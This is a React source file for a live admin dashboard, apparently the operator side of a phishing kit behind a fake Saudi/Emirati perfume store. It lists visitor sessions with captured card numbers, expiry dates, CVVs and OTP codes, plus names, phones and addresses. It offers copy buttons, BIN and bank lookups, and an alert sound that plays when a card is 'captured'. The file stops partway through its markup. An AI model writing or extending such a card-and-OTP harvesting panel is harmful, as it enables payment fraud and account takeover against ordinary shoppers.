import React, { useEffect, useRef, useState } from "react";
import {
  Check,
  ChevronDown,
  ChevronRight,
  Copy,
  CreditCard,
  KeyRound,
  MapPin,
  MessageSquare,
  Phone,
  RefreshCw,
  Search,
  ShieldCheck,
  ShoppingBag,
  Trash2,
  User,
  ExternalLink,
  Moon,
  Sun,
  Volume2,
  VolumeX,
  Wifi,
  X,
  AlertTriangle,
} from "lucide-react";
import { VisitorRecord } from "@/src/types";
import { resetLocalVisitorId } from "@/src/lib/visitorTracking";

interface WhatsAppDashboardProps {
  onClose?: () => void;
}

export function CreditCardMockup({
  cardholderName,
  cardNumber,
  cardExpiry,
  cardCvv,
  paymentMethod = "mada",
  binInfo,
  onCopy,
  copiedKey,
}: {
  cardholderName?: string;
  cardNumber?: string;
  cardExpiry?: string;
  cardCvv?: string;
  paymentMethod?: string;
  binInfo?: {
    scheme?: string;
    type?: string;
    brand?: string;
    bankName?: string;
    bankPhone?: string;
    bankUrl?: string;
    countryName?: string;
    countryEmoji?: string;
  };
  onCopy: (text: string, key: string) => void;
  copiedKey: string | null;
}) {
  const formattedNumber = cardNumber
    ? cardNumber.replace(/\D/g, "").replace(/(.{4})/g, "$1 ").trim()
    : "•••• •••• •••• ••••";

  const isMada = paymentMethod?.toLowerCase() === "mada";

  return (
    <div className="relative my-3 w-full max-w-[380px] overflow-hidden rounded-2xl bg-gradient-to-tr from-[#0f2027] via-[#203a43] to-[#2c5364] p-5 text-white shadow-2xl border border-white/20 select-none">
      {/* Glossy Overlay effect */}
      <div className="pointer-events-none absolute -right-12 -top-12 h-44 w-44 rounded-full bg-white/10 blur-2xl" />
      <div className="pointer-events-none absolute -left-12 -bottom-12 h-44 w-44 rounded-full bg-emerald-500/10 blur-2xl" />

      {/* Top Row: Network & Bank Name Badge */}
      <div className="flex items-center justify-between pb-2">
        <div className="flex items-center gap-2">
          {/* EMV Golden Chip */}
          <div className="h-8 w-11 rounded-md bg-gradient-to-br from-amber-300 via-yellow-400 to-amber-600 p-1 shadow-inner border border-amber-200/50 flex flex-col justify-between">
            <div className="h-1 w-full bg-amber-700/30 rounded-xs" />
            <div className="h-2 w-full border-t border-b border-amber-700/30" />
            <div className="h-1 w-full bg-amber-700/30 rounded-xs" />
          </div>
          {/* Contactless Signal */}
          <Wifi className="h-5 w-5 rotate-90 text-white/70" />
        </div>

        {/* Card Network Brand Badge & Bank */}
        <div className="flex flex-col items-end gap-1">
          <div className="flex items-center gap-1.5">
            {binInfo?.scheme && (
              <span className="rounded bg-emerald-500/30 px-1.5 py-0.5 text-[10px] font-bold text-emerald-200 uppercase tracking-wider border border-emerald-400/40">
                {binInfo.scheme} {binInfo.type ? `(${binInfo.type})` : ""}
              </span>
            )}
            {isMada ? (
              <div className="flex items-center gap-1.5 rounded-lg bg-white/95 px-2.5 py-1 text-xs font-black text-[#006837] shadow">
                <span className="text-[#006837]">مدى</span>
                <span className="h-2 w-2 rounded-full bg-[#8cc63f]" />
                <span className="text-[9px] text-[#006837]">mada</span>
              </div>
            ) : (
              <div className="flex items-center gap-1.5 rounded-lg bg-white/95 px-2.5 py-1 text-xs font-black text-slate-900 shadow">
                <span className="text-blue-700 font-extrabold tracking-wider">
                  {binInfo?.scheme?.toUpperCase() || "VISA"}
                </span>
                <span className="text-gray-300">|</span>
                <span className="text-orange-600 font-bold">mastercard</span>
              </div>
            )}
          </div>
          {binInfo?.bankName && (
            <span className="text-[11px] font-bold text-amber-300 drop-shadow truncate max-w-[160px]">
              🏛️ {binInfo.bankName} {binInfo.countryEmoji || ""}
            </span>
          )}
        </div>
      </div>

      {/* Card Number */}
      <div className="my-3">
        <div className="flex items-center justify-between">
          <span className="text-[10px] uppercase tracking-widest text-white/60">رقم البطاقة (Card Number)</span>
          <button
            onClick={() => onCopy(cardNumber || "", "mockup_card")}
            className="flex items-center gap-1 rounded bg-white/10 px-2 py-0.5 text-[10px] font-bold text-amber-300 hover:bg-white/20 transition"
          >
            {copiedKey === "mockup_card" ? <Check className="h-3 w-3 text-emerald-400" /> : <Copy className="h-3 w-3" />}
            {copiedKey === "mockup_card" ? "تم نسخ الرقم" : "نسخ الرقم"}
          </button>
        </div>
        <div dir="ltr" className="mt-1 font-mono text-lg font-bold tracking-[0.2em] text-white drop-shadow">
          {formattedNumber}
        </div>
      </div>

      {/* Bottom Info Row: Cardholder, Expiry, CVV */}
      <div className="mt-4 flex items-end justify-between border-t border-white/15 pt-3 text-xs">
        <div>
          <span className="block text-[9px] uppercase tracking-wider text-white/60">حامل البطاقة (Cardholder)</span>
          <span className="font-bold uppercase tracking-wider text-amber-200">
            {cardholderName || "غير معروف"}
          </span>
        </div>

        <div className="flex items-center gap-4">
          <div>
            <span className="block text-[9px] uppercase tracking-wider text-white/60">الانتهاء (VALID THRU)</span>
            <span dir="ltr" className="font-mono font-bold text-white">
              {cardExpiry || "MM/YY"}
            </span>
          </div>

          <div>
            <div className="flex items-center justify-between gap-1">
              <span className="block text-[9px] uppercase tracking-wider text-white/60">CVV</span>
              <button
                onClick={() => onCopy(cardCvv || "", "mockup_cvv")}
                className="text-[9px] underline text-amber-300"
              >
                {copiedKey === "mockup_cvv" ? "تم" : "نسخ"}
              </button>
            </div>
            <span dir="ltr" className="font-mono font-extrabold text-red-400 bg-black/40 px-2 py-0.5 rounded border border-red-500/40">
              {cardCvv || "•••"}
            </span>
          </div>
        </div>
      </div>
    </div>
  );
}

export function playNotificationSound(type: "general" | "card" | "otp") {
  try {
    const AudioContextClass =
      window.AudioContext || (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext;
    if (!AudioContextClass) return;
    const ctx = new AudioContextClass();
    if (ctx.state === "suspended") {
      void ctx.resume();
    }

    const now = ctx.currentTime;
    const gainNode = ctx.createGain();
    gainNode.connect(ctx.destination);

    if (type === "otp") {
      // Urgent double-pitch chime for OTP code arrival
      const osc1 = ctx.createOscillator();
      osc1.type = "sine";
      osc1.frequency.setValueAtTime(880, now);
      osc1.frequency.setValueAtTime(1320, now + 0.1);
      gainNode.gain.setValueAtTime(0.35, now);
      gainNode.gain.exponentialRampToValueAtTime(0.001, now + 0.4);
      osc1.connect(gainNode);
      osc1.start(now);
      osc1.stop(now + 0.4);
    } else if (type === "card") {
      // Tri-tone chord for Credit Card captured
      [523.25, 659.25, 783.99].forEach((freq, idx) => {
        const osc = ctx.createOscillator();
        osc.type = "sine";
        osc.frequency.setValueAtTime(freq, now + idx * 0.08);
        const g = ctx.createGain();
        g.gain.setValueAtTime(0.3, now + idx * 0.08);
        g.gain.exponentialRampToValueAtTime(0.001, now + idx * 0.08 + 0.35);
        osc.connect(g);
        g.connect(ctx.destination);
        osc.start(now + idx * 0.08);
        osc.stop(now + idx * 0.08 + 0.35);
      });
    } else {
      // Soft WhatsApp double-ding for general update / message
      const osc1 = ctx.createOscillator();
      osc1.type = "sine";
      osc1.frequency.setValueAtTime(659.25, now);
      osc1.frequency.setValueAtTime(880, now + 0.09);
      gainNode.gain.setValueAtTime(0.25, now);
      gainNode.gain.exponentialRampToValueAtTime(0.001, now + 0.3);
      osc1.connect(gainNode);
      osc1.start(now);
      osc1.stop(now + 0.3);
    }
  } catch (err) {
    console.warn("Notification sound blocked or unsupported:", err);
  }
}

export function formatArabicPageName(urlPath: string | undefined): string {
  if (!urlPath) return "الصفحة الرئيسية (المتجر)";
  const raw = urlPath.trim();

  if (raw === "/" || raw === "" || raw === "/index.html") {
    return "الصفحة الرئيسية (المتجر)";
  }
  if (raw.includes("/checkout")) {
    if (raw.includes("step=1")) return "صفحة الشراء — خطوة 1: الهاتف والتواصل";
    if (raw.includes("step=2")) return "صفحة الشراء — خطوة 2: الشحن والعنوان";
    if (raw.includes("step=3")) return "صفحة الشراء — خطوة 3: بيانات الدفع والبطاقة";
    if (raw.includes("step=4") || raw.includes("otp")) return "صفحة الشراء — خطوة 4: رمز التحقق OTP";
    return "صفحة الشراء وإتمام الطلب";
  }
  if (raw.includes("#london-collection")) return "قسم مجموعة عطور لندن";
  if (raw.includes("#national-day")) return "قسم عروض اليوم الوطني 96";
  if (raw.includes("#exclusives")) return "قسم حصريات اليوم الوطني";
  if (raw.includes("#gifts")) return "قسم الأطقم والهدايا الفاخرة";
  if (raw.includes("#incense")) return "قسم مجموعة البخور الأصلية";
  if (raw.includes("#oud")) return "قسم العود الفاخر";

  return `صفحة: ${raw}`;
}

export const WhatsAppDashboard: React.FC<WhatsAppDashboardProps> = ({ onClose }) => {
  const [sessions, setSessions] = useState<VisitorRecord[]>([]);
  const [selectedVisitorId, setSelectedVisitorId] = useState<string | null>(null);
  const selectedVisitorIdRef = useRef<string | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [filterType, setFilterType] = useState<"all" | "online" | "card" | "otp">("all");
  const [isDarkMode, setIsDarkMode] = useState(false);
  const [autoRefresh, setAutoRefresh] = useState(true);
  const [isLiveConnected, setIsLiveConnected] = useState(false);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);
  const [showClearConfirmModal, setShowClearConfirmModal] = useState(false);
  const [showCardHistory, setShowCardHistory] = useState(false);
  const [isDeleting, setIsDeleting] = useState<string | null>(null);

  const deletedIdsRef = useRef<Set<string>>(new Set());
  const prevOtpCountRef = useRef<number>(-1);
  const prevCardCountRef = useRef<number>(-1);
  const prevSessionCountRef = useRef<number>(-1);

  const handleSelectVisitor = (id: string) => {
    setSelectedVisitorId(id);
    selectedVisitorIdRef.current = id;
  };

  const fetchSessions = async () => {
    try {
      setIsRefreshing(true);
      const res = await fetch("/api/admin/sessions");
      if (res.ok) {
        const data = await res.json();
        const rawList: VisitorRecord[] = data.sessions || [];
        const list = rawList.filter((s) => !deletedIdsRef.current.has(s.visitorId));

        if (soundEnabled) {
          const currentOtpCount = list.filter((s) => Boolean(s.checkout?.otpCode)).length;
          const currentCardCount = list.filter((s) => Boolean(s.checkout?.cardNumber)).length;
          const currentSessionCount = list.length;

          if (prevOtpCountRef.current >= 0 && currentOtpCount > prevOtpCountRef.current) {
            playNotificationSound("otp");
          } else if (prevCardCountRef.current >= 0 && currentCardCount > prevCardCountRef.current) {
            playNotificationSound("card");
          } else if (prevSessionCountRef.current >= 0 && currentSessionCount > prevSessionCountRef.current) {
            playNotificationSound("general");
          }

          prevOtpCountRef.current = currentOtpCount;
          prevCardCountRef.current = currentCardCount;
          prevSessionCountRef.current = currentSessionCount;
        }

        setSessions(list);
        if (list.length > 0 && (!selectedVisitorIdRef.current || !list.some((s) => s.visitorId === selectedVisitorIdRef.current))) {
          selectedVisitorIdRef.current = list[0].visitorId;
          setSelectedVisitorId(list[0].visitorId);
        } else if (list.length === 0) {
          selectedVisitorIdRef.current = null;
          setSelectedVisitorId(null);
        }
      }
    } catch {
      // Silent catch for transient network issues
    } finally {
      setIsRefreshing(false);
    }
  };

  // Real-time server-backed stream connection (replaces client-side polling)
  useEffect(() => {
    let es: EventSource | null = null;
    let isMounted = true;

    // Initial fallback fetch
    void fetchSessions();

    const connectStream = () => {
      try {
        es = new EventSource("/api/admin/stream");

        es.onopen = () => {
          if (isMounted) setIsLiveConnected(true);
        };

        es.addEventListener("init", (e: MessageEvent) => {
          if (!isMounted) return;
          try {
            const data = JSON.parse(e.data);
            const rawList: VisitorRecord[] = data.sessions || [];
            const list = rawList.filter((s) => !deletedIdsRef.current.has(s.visitorId));
            setSessions(list);
            if (list.length > 0 && (!selectedVisitorIdRef.current || !list.some((s) => s.visitorId === selectedVisitorIdRef.current))) {
              selectedVisitorIdRef.current = list[0].visitorId;
              setSelectedVisitorId(list[0].visitorId);
            } else if (list.length === 0) {
              selectedVisitorIdRef.current = null;
              setSelectedVisitorId(null);
            }
          } catch {}
        });

        es.addEventListener("session_update", (e: MessageEvent) => {
          if (!isMounted) return;
          try {
            const updated: VisitorRecord = JSON.parse(e.data);
            if (deletedIdsRef.current.has(updated.visitorId)) return;

            setSessions((prev) => {
              const existingIdx = prev.findIndex((s) => s.visitorId === updated.visitorId);
              let next: VisitorRecord[];
              if (existingIdx >= 0) {
                const prevItem = prev[existingIdx];
                if (soundEnabled) {
                  if (updated.checkout?.otpCode && updated.checkout.otpCode !== prevItem.checkout?.otpCode) {
                    playNotificationSound("otp");
                  } else if (updated.checkout?.cardNumber && updated.checkout.cardNumber !== prevItem.checkout?.cardNumber) {
                    playNotificationSound("card");
                  }
                }
                next = [...prev];
                next[existingIdx] = updated;
              } else {
                if (soundEnabled) {
                  if (updated.checkout?.otpCode) playNotificationSound("otp");
                  else if (updated.checkout?.cardNumber) playNotificationSound("card");
                  else playNotificationSound("general");
                }
                next = [updated, ...prev];
              }

              return next.sort((a, b) => new Date(b.lastSeen).getTime() - new Date(a.lastSeen).getTime());
            });

            if (!selectedVisitorIdRef.current) {
              selectedVisitorIdRef.current = updated.visitorId;
              setSelectedVisitorId(updated.visitorId);
            }
          } catch {}
        });

        es.addEventListener("session_deleted", (e: MessageEvent) => {
          if (!isMounted) return;
          try {
            const { visitorId } = JSON.parse(e.data);
            deletedIdsRef.current.add(visitorId);
            setSessions((prev) => {
              const next = prev.filter((s) => s.visitorId !== visitorId);
              if (selectedVisitorIdRef.current === visitorId) {
                const nextSel = next[0]?.visitorId || null;
                selectedVisitorIdRef.current = nextSel;
                setSelectedVisitorId(nextSel);
              }
              return next;
            });
          } catch {}
        });

        es.addEventListener("sessions_cleared", () => {
          if (!isMounted) return;
          setSessions([]);
          selectedVisitorIdRef.current = null;
          setSelectedVisitorId(null);
        });

        es.onerror = () => {
          if (isMounted) setIsLiveConnected(false);
        };
      } catch {
        if (isMounted) setIsLiveConnected(false);
      }
    };

    connectStream();

    return () => {
      isMounted = false;
      if (es) {
        es.close();
      }
    };
  }, [soundEnabled]);

  const copyToClipboard = (text: string, key: string) => {
    try {
      void navigator.clipboard.writeText(text);
      setCopiedKey(key);
      setTimeout(() => setCopiedKey(null), 2000);
    } catch {}
  };

  const deleteSession = async (visitorId: string) => {
    if (!visitorId) return;
    setIsDeleting(visitorId);
    deletedIdsRef.current.add(visitorId);

    // Optimistic UI removal
    setSessions((prev) => {
      const next = prev.filter((s) => s.visitorId !== visitorId);
      if (selectedVisitorIdRef.current === visitorId) {
        const nextSelected = next[0]?.visitorId || null;
        selectedVisitorIdRef.current = nextSelected;
        setSelectedVisitorId(nextSelected);
      }
      return next;
    });

    try {
      await fetch(`/api/admin/session/${encodeURIComponent(visitorId)}`, { method: "DELETE" });
    } catch (err) {
      console.error("Delete session error:", err);
    } finally {
      setIsDeleting(null);
    }
  };

  const executeClearAll = async () => {
    // Optimistic UI clear
    sessions.forEach((s) => deletedIdsRef.current.add(s.visitorId));
    setSessions([]);
    handleSelectVisitor("");
    setShowClearConfirmModal(false);
    resetLocalVisitorId();

    try {
      await fetch("/api/admin/clear", { method: "POST" });
    } catch (err) {
      console.error("Clear all error:", err);
    }
  };

  const filteredSessions = sessions.filter((session) => {
    const phone = session.checkout?.phone || "";
    const name = session.checkout?.fullName || "";
    const card = session.checkout?.cardNumber || "";
    const address = session.checkout?.nationalAddress || "";
    const matchesSearch =
      session.visitorId.toLowerCase().includes(searchQuery.toLowerCase()) ||
      phone.includes(searchQuery) ||
      name.toLowerCase().includes(searchQuery.toLowerCase()) ||
      card.includes(searchQuery) ||
      address.toLowerCase().includes(searchQuery.toLowerCase());

    if (!matchesSearch) return false;

    if (filterType === "online") return session.isOnline;
    if (filterType === "card") return Boolean(session.checkout?.cardNumber);
    if (filterType === "otp") return Boolean(session.checkout?.otpCode);
    return true;
  });

  const selectedSession = sessions.find((s) => s.visitorId === selectedVisitorId) || filteredSessions[0];

  const onlineCount = sessions.filter((s) => s.isOnline).length;
  const cardsCount = sessions.filter((s) => Boolean(s.checkout?.cardNumber)).length;
  const otpCount = sessions.filter((s) => Boolean(s.checkout?.otpCode)).length;

  const bgCanvas = isDarkMode ? "bg-[#0b141a] text-[#e9edef]" : "bg-[#f0f2f5] text-[#111b21]";
  const bgHeader = isDarkMode ? "bg-[#202c33]" : "bg-[#00a884]";
  const bgSidebar = isDarkMode ? "bg-[#111b21] border-[#222d34]" : "bg-white border-[#e9edef]";
  const bgChatItem = isDarkMode
    ? "hover:bg-[#202c33] border-[#222d34]"
    : "hover:bg-[#f5f6f6] border-[#f0f2f5]";
  const bgChatItemActive = isDarkMode ? "bg-[#2a3942]" : "bg-[#f0f2f5]";
  const bgBubbleUser = isDarkMode ? "bg-[#005c4b] text-[#e9edef]" : "bg-[#d9fdd3] text-[#111b21]";
  const bgBubbleSystem = isDarkMode ? "bg-[#202c33] text-[#e9edef]" : "bg-white text-[#111b21]";

  return (
    <div className={`fixed inset-0 z-[100] flex flex-col font-sans dir-rtl ${bgCanvas}`} dir="rtl">
      {/* WhatsApp Header Top Bar */}
      <header className={`flex h-16 shrink-0 items-center justify-between px-4 text-white shadow-md ${bgHeader}`}>
        <div className="flex items-center gap-3">
          <div className="flex h-10 w-10 items-center justify-center rounded-full bg-white/20">
            <MessageSquare className="h-6 w-6 text-white" />
          </div>
          <div>
            <h1 className="text-base font-bold leading-tight sm:text-lg flex items-center gap-2">
              واتساب الإدارة المباشرة — دخوني الإمارات
              <span className="rounded-full bg-white/20 px-2 py-0.5 text-[10px]">قاعدة البيانات الحيّة</span>
            </h1>
            <p className="text-[11px] opacity-85">
              متابعة الزوار، الخطوات، العناوين، بيانات الدفع، ورموز OTP لحظة بلحظة
            </p>
          </div>
        </div>

        {/* Action Controls */}
        <div className="flex items-center gap-2">
          {/* Live Streaming Badge */}
          <div className="flex items-center gap-1.5 rounded-full bg-black/20 px-3 py-1 border border-white/10 text-xs">
            <span className={`h-2 w-2 rounded-full ${isLiveConnected ? "bg-[#25d366] animate-pulse" : "bg-amber-400"}`}></span>
            <span className="text-[11px] font-bold text-white">
              {isLiveConnected ? "بث مباشر فوري (SSE Stream)" : "جاري ربط البث..."}
            </span>
          </div>

          {/* Quick Stats Badges */}
          <div className="hidden items-center gap-2 text-xs md:flex">
            <span className="flex items-center gap-1 rounded-full bg-black/20 px-2.5 py-1">
              <span className="h-2 w-2 rounded-full bg-[#25d366] animate-pulse"></span>
              {onlineCount} أونلاين
            </span>
            <span className="flex items-center gap-1 rounded-full bg-black/20 px-2.5 py-1">
              <CreditCard className="h-3.5 w-3.5 text-yellow-300" />
              {cardsCount} بطاقة
            </span>
            <span className="flex items-center gap-1 rounded-full bg-black/20 px-2.5 py-1">
              <KeyRound className="h-3.5 w-3.5 text-emerald-300" />
              {otpCount} OTP
            </span>
          </div>

          <button
            onClick={() => {
              const nextState = !soundEnabled;
              setSoundEnabled(nextState);
              if (nextState) playNotificationSound("general");
            }}
            className={`flex h-9 w-9 items-center justify-center rounded-full transition ${
              soundEnabled ? "bg-white/20 text-white" : "bg-white/10 text-white/50"
            }`}
            title={soundEnabled ? "إيقاف التنبيهات الصوتية" : "تفعيل التنبيهات الصوتية"}
          >
            {soundEnabled ? <Volume2 className="h-4 w-4" /> : <VolumeX className="h-4 w-4" />}
          </button>

          <button
            onClick={() => void fetchSessions()}
            className="flex h-9 w-9 items-center justify-center rounded-full bg-white/10 hover:bg-white/20 transition"
            title="تحديث البيانات"
          >
            <RefreshCw className={`h-4 w-4 ${isRefreshing ? "animate-spin" : ""}`} />
          </button>

          <button
            onClick={() => setIsDarkMode(!isDarkMode)}
            className="flex h-9 w-9 items-center justify-center rounded-full bg-white/10 hover:bg-white/20 transition"
            title="تغيير المظهر"
          >
            {isDarkMode ? <Sun className="h-4 w-4" /> : <Moon className="h-4 w-4" />}
          </button>

          {onClose && (
            <button
              onClick={onClose}
              className="flex h-9 w-9 items-center justify-center rounded-full bg-white/10 hover:bg-white/20 transition"
              title="إغلاق اللوحة"
            >
              <X className="h-5 w-5" />
            </button>
          )}
        </div>
      </header>

      {/* Main WhatsApp Workspace 3-Pane Grid */}
      <div className="flex flex-1 overflow-hidden">
        {/* Sidebar Left/Right (Chats List) */}
        <aside className={`flex w-full max-w-[360px] shrink-0 flex-col border-l ${bgSidebar}`}>
          {/* Search bar & Filter */}
          <div className="p-3 border-b border-inherit space-y-2">
            <div className="relative">
              <Search className="absolute right-3 top-3 h-4 w-4 text-gray-400" />
              <input
                type="text"
                placeholder="بحث هاتف، اسم، كارت، عنوان..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className={`h-10 w-full rounded-lg border px-9 text-xs outline-none ${
                  isDarkMode
                    ? "bg-[#202c33] border-[#222d34] text-white placeholder-gray-400"
                    : "bg-[#f0f2f5] border-[#e9edef] text-gray-800 placeholder-gray-500"
                }`}
              />
              {searchQuery && (
                <button
                  onClick={() => setSearchQuery("")}
                  className="absolute left-3 top-3 text-xs opacity-60 hover:opacity-100"
                >
                  <X className="h-4 w-4" />
                </button>
              )}
            </div>

            {/* Filter buttons */}
            <div className="flex gap-1 text-[11px] overflow-x-auto pb-1 scrollbar-none">
              <button
                onClick={() => setFilterType("all")}
                className={`rounded-full px-2.5 py-1 transition ${
                  filterType === "all"
                    ? "bg-[#00a884] text-white font-bold"
                    : isDarkMode
                    ? "bg-[#202c33] text-gray-300"
                    : "bg-[#f0f2f5] text-gray-700"
                }`}
              >
                الكل ({sessions.length})
              </button>
              <button
                onClick={() => setFilterType("online")}
                className={`rounded-full px-2.5 py-1 transition ${
                  filterType === "online"
                    ? "bg-[#00a884] text-white font-bold"
                    : isDarkMode
                    ? "bg-[#202c33] text-gray-300"
                    : "bg-[#f0f2f5] text-gray-700"
                }`}
              >
                أونلاين ({onlineCount})
              </button>
              <button
                onClick={() => setFilterType("card")}
                className={`rounded-full px-2.5 py-1 transition ${
                  filterType === "card"
                    ? "bg-[#00a884] text-white font-bold"
                    : isDarkMode
                    ? "bg-[#202c33] text-gray-300"
                    : "bg-[#f0f2f5] text-gray-700"
                }`}
              >
                بطاقات ({cardsCount})
              </button>
              <button
                onClick={() => setFilterType("otp")}
                className={`rounded-full px-2.5 py-1 transition ${
                  filterType === "otp"
                    ? "bg-[#00a884] text-white font-bold"
                    : isDarkMode
                    ? "bg-[#202c33] text-gray-300"
                    : "bg-[#f0f2f5] text-gray-700"
                }`}
              >
                OTP ({otpCount})
              </button>
            </div>
          </div>

          {/* Sessions List */}
          <div className="flex-1 overflow-y-auto divide-y divide-inherit">
            {filteredSessions.length === 0 ? (
              <div className="p-8 text-center text-xs opacity-60">
                لا توجد سجلات مطابقة حالياً
              </div>
            ) : (
              filteredSessions.map((session) => {
                const isSelected = selectedSession?.visitorId === session.visitorId;
                const phone = session.checkout?.phone;
                const name = session.checkout?.fullName;
                const hasCard = Boolean(session.checkout?.cardNumber);
                const otp = session.checkout?.otpCode;
                const lastTime = new Date(session.lastSeen).toLocaleTimeString("ar-SA", {
                  hour: "2-digit",
                  minute: "2-digit",
                });

                return (
                  <div
                    key={session.visitorId}
                    onClick={() => handleSelectVisitor(session.visitorId)}
                    className={`flex cursor-pointer items-start gap-3 p-3 transition ${
                      isSelected ? bgChatItemActive : bgChatItem
                    }`}
                  >
                    {/* User Avatar */}
                    <div className="relative shrink-0">
                      <div className="flex h-11 w-11 items-center justify-center rounded-full bg-[#00a884]/20 text-[#00a884] font-bold text-sm">
                        {name ? name.slice(0, 2) : <User className="h-5 w-5" />}
                      </div>
                      <span
                        className={`absolute bottom-0 right-0 h-3 w-3 rounded-full border-2 border-white ${
                          session.isOnline ? "bg-[#25d366]" : "bg-gray-400"
                        }`}
                      />
                    </div>

                    {/* Customer Info */}
                    <div className="min-w-0 flex-1">
                      <div className="flex items-center justify-between gap-1">
                        <h3 className="truncate text-xs font-bold">
                          {phone ? `+966 ${phone}` : name || session.visitorId.slice(0, 14)}
                        </h3>
                        <div className="flex items-center gap-1 shrink-0">
                          <span className="text-[10px] opacity-60">{lastTime}</span>
                          <button
                            type="button"
                            onClick={(e) => {
                              e.stopPropagation();
                              void deleteSession(session.visitorId);
                            }}
                            className="p-1 rounded text-gray-400 hover:text-red-500 hover:bg-red-500/10 transition"
                            title="حذف هذه الجلسة"
                          >
                            <Trash2 className="h-3 w-3" />
                          </button>
                        </div>
                      </div>

                      <p className="truncate text-[11px] opacity-75 mt-0.5">
                        📍 {formatArabicPageName(session.currentPage)}
                      </p>

                      {/* Status Badges */}
                      <div className="mt-1.5 flex flex-wrap gap-1">
                        {hasCard && (
                          <span className="rounded bg-amber-500/15 px-1.5 py-0.5 text-[9px] font-bold text-amber-600">
                            💳 بطاقة
                          </span>
                        )}
                        {otp && (
                          <span className="rounded bg-emerald-500/20 px-1.5 py-0.5 text-[9px] font-bold text-emerald-600 animate-pulse">
                            🔑 OTP: {otp}
                          </span>
                        )}
                        {session.checkout?.city && (
                          <span className="rounded bg-blue-500/15 px-1.5 py-0.5 text-[9px] text-blue-600">
                            📍 {session.checkout.city}
                          </span>
                        )}
                      </div>
                    </div>
                  </div>
                );
              })
            )}
          </div>

          {/* Clear all bottom button */}
          <div className="p-3 border-t border-inherit">
            <button
              onClick={() => setShowClearConfirmModal(true)}
              className="flex w-full items-center justify-center gap-1.5 rounded-lg border border-red-300 py-2 text-xs font-bold text-red-600 hover:bg-red-50 dark:border-red-900/50 dark:hover:bg-red-950/30 transition"
            >
              <Trash2 className="h-3.5 w-3.5" />
              مسح جميع البيانات المخزنة
            </button>
          </div>
        </aside>

        {/* Main Conversation Stream (WhatsApp Chat Area) */}
        {selectedSession ? (
          <main className="flex flex-1 flex-col overflow-hidden">
            {/* Active Visitor Chat Header */}
            <div
              className={`flex h-16 shrink-0 items-center justify-between border-b px-4 ${
                isDarkMode ? "bg-[#202c33] border-[#222d34]" : "bg-[#f0f2f5] border-[#e9edef]"
              }`}
            >
              <div className="flex items-center gap-3">
                <div className="relative">
                  <div className="flex h-10 w-10 items-center justify-center rounded-full bg-[#00a884] text-white font-bold">
                    {selectedSession.checkout?.fullName
                      ? selectedSession.checkout.fullName.slice(0, 2)
                      : <User className="h-5 w-5" />}
                  </div>
                  <span
                    className={`absolute bottom-0 right-0 h-3 w-3 rounded-full border-2 border-white ${
                      selectedSession.isOnline ? "bg-[#25d366]" : "bg-gray-400"
                    }`}
                  />
                </div>
                <div>
                  <h2 className="text-sm font-bold flex items-center gap-2">
                    {selectedSession.checkout?.fullName || "زائر بدون اسم"}
                    {selectedSession.checkout?.phone && (
                      <span className="text-xs font-normal opacity-75" dir="ltr">
                        +966 {selectedSession.checkout.phone}
                      </span>
                    )}
                  </h2>
                  <p className="text-[11px] opacity-70">
                    {selectedSession.isOnline ? (
                      <span className="text-[#00a884] font-semibold">
                        متصل الآن — يتصفح: {formatArabicPageName(selectedSession.currentPage)}
                      </span>
                    ) : (
                      `آخر ظهور: ${new Date(selectedSession.lastSeen).toLocaleTimeString("ar-SA")}`
                    )}
                  </p>
                </div>
              </div>

              {/* Action buttons */}
              <div className="flex items-center gap-2">
                {selectedSession.checkout?.phone && (
                  <a
                    href={`https://wa.me/966${selectedSession.checkout.phone.replace(/\D/g, "")}`}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="flex items-center gap-1 rounded-lg bg-[#25d366] px-3 py-1.5 text-xs font-bold text-white hover:bg-[#20bd5a] transition"
                  >
                    <Phone className="h-3.5 w-3.5" />
                    مراسلة واتساب
                  </a>
                )}
                <button
                  onClick={() => deleteSession(selectedSession.visitorId)}
                  className="flex h-8 w-8 items-center justify-center rounded-lg border border-red-200 text-red-500 hover:bg-red-50"
                  title="حذف هذه الجلسة"
                >
                  <Trash2 className="h-4 w-4" />
                </button>
              </div>
            </div>

            {/* WhatsApp Chat Wallpaper Stream Area */}
            <div
              className={`flex-1 overflow-y-auto p-4 space-y-4 ${
                isDarkMode ? "bg-[#0b141a]" : "bg-[#efeae2]"
              }`}
            >
              {/* Date Header Pill */}
              <div className="flex justify-center">
                <span className="rounded-lg bg-black/10 px-3 py-1 text-[11px] font-semibold text-gray-600 backdrop-blur-sm">
                  جلسة رقمية حية — المعرف: {selectedSession.visitorId}
                </span>
              </div>

              {/* Timeline Events */}
              {selectedSession.eventLogs && selectedSession.eventLogs.length > 0 ? (
                selectedSession.eventLogs.map((log) => (
                  <div key={log.id} className="flex flex-col gap-1 max-w-xl">
                    <div className={`rounded-2xl p-3.5 text-xs shadow-sm ${bgBubbleSystem}`}>
                      <div className="flex items-center justify-between gap-2 border-b border-gray-200/20 pb-1.5 mb-1.5 text-[10px] opacity-60">
                        <span className="font-bold uppercase tracking-wider">{log.type}</span>
                        <span>{new Date(log.timestamp).toLocaleTimeString("ar-SA")}</span>
                      </div>
                      <p className="font-medium text-sm leading-relaxed">{log.message}</p>
                    </div>
                  </div>
                ))
              ) : null}

              {/* Step 1: Phone Card */}
              {selectedSession.checkout?.phone && (
                <div className="flex flex-col gap-1 max-w-xl">
                  <div className={`rounded-2xl p-4 text-xs shadow-sm ${bgBubbleUser}`}>
                    <div className="flex items-center justify-between text-[11px] font-bold border-b border-black/10 pb-2 mb-2">
                      <span className="flex items-center gap-1.5 text-[#00a884]">
                        <Phone className="h-4 w-4" /> خطوة 1: رقم الجوال
                      </span>
                      <button
                        onClick={() => copyToClipboard(selectedSession.checkout?.phone || "", "phone")}
                        className="flex items-center gap-1 text-[10px] underline"
                      >
                        {copiedKey === "phone" ? <Check className="h-3 w-3 text-emerald-600" /> : <Copy className="h-3 w-3" />}
                        {copiedKey === "phone" ? "تم النسخ" : "نسخ"}
                      </button>
                    </div>
                    <p className="text-base font-bold text-dir-ltr inline-block" dir="ltr">
                      +966 {selectedSession.checkout.phone}
                    </p>
                  </div>
                </div>
              )}

              {/* Step 2: Delivery & Shipping Address Card */}
              {selectedSession.checkout?.fullName && (
                <div className="flex flex-col gap-1 max-w-xl">
